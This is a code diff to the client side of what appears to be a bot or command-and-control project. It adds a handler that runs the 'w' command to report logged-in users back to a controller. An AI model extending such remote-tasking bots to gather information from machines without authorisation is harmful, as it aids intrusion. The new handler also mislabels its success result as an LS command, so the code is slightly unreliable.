@@ -1,5 +1,6 @@
 from threading import Thread
 import os
+import subprocess
 from common.data.commands import CommandExecutionRequest, CommandExecutionResult, CommandTypes, CommandStatus
 from slave.src.data.context import get_new_commands_arrived_condition, \
     get_commands_from_queue, get_bot_id
@@ -13,6 +14,19 @@ def __execute_ls(param: str) -> CommandExecutionResult:
     except FileNotFoundError as e:
         return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.LS, param=param,
                                       status=CommandStatus.ERROR, results=[e])
+
+
+def __execute_w() -> CommandExecutionResult:
+    result = subprocess.run(["w"], capture_output=True, text=True)
+    if result.stderr != "":
+        return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.W, param="",
+                                      status=CommandStatus.ERROR, results=[result.stderr])
+
+    return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.LS, param="",
+                                  status=CommandStatus.SUCCESS, results=[result.stdout])
+
+
+
 
 
 def __execute_command(command: CommandExecutionRequest) -> CommandExecutionResult:
